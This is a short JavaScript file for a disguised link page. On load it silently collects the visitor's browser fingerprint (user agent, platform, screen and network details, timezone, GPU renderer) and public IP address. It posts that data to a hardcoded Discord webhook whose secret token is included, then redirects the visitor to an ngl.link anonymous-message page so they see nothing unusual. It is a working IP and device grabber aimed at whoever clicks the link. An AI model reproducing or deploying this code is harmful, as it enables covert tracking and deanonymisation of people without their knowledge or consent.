const getBrowserInfo = async () => {
  const data = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    cookieEnabled: navigator.cookieEnabled,
    hardwareConcurrency: navigator.hardwareConcurrency,
    deviceMemory: navigator.deviceMemory,
    geolocation: null,
    screen: {
      width: window.screen.width,
      height: window.screen.height,
      pixelDepth: window.screen.pixelDepth,
    },
    viewport: {
      width: window.innerWidth,
      height: window.innerHeight,
    },
    network: {
      type: navigator.connection?.effectiveType,
      downlink: navigator.connection?.downlink,
      rtt: navigator.connection?.rtt,
    },
    deviceBootTime: window.performance?.timing?.navigationStart,
    contentLanguage: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    webglRenderer: (() => {
      const canvas = document.createElement("canvas");
      const gl =
        canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const info = gl.getExtension("WEBGL_debug_renderer_info");
        return gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
      }
      return null;
    })(),
  };

  // Retrieve IP address data from ipify.org API
  try {
    const { ip } = await fetch("https://api.ipify.org?format=json")
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
      });
    data.geolocation = ip;
  } catch (error) {
    console.error("Error retrieving IP address: ", error);
  }

  // Log browser information
  console.log(data);

  // Send data to Discord webhook
  //bro my discord webhook :(( -mstjk
  const webhookUrl = "https://discord.com/api/webhooks/1130871499692183602/Jwp5yAfmTbxstZJ7FcWBPqZee62_gTlRjfx3pYcPGEe-c0Tw9Y9F0t-AdFCpoNj7bcpM";
  const response = await fetch(webhookUrl, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ content: JSON.stringify(data) }),
  });
  console.log("Discord webhook response:", response.status);

  // Redirect to target page
  window.location.href = "https://ngl.link/yulbeen_yuliana";
};

// Call the function to retrieve browser information and send it to Discord webhook
getBrowserInfo();
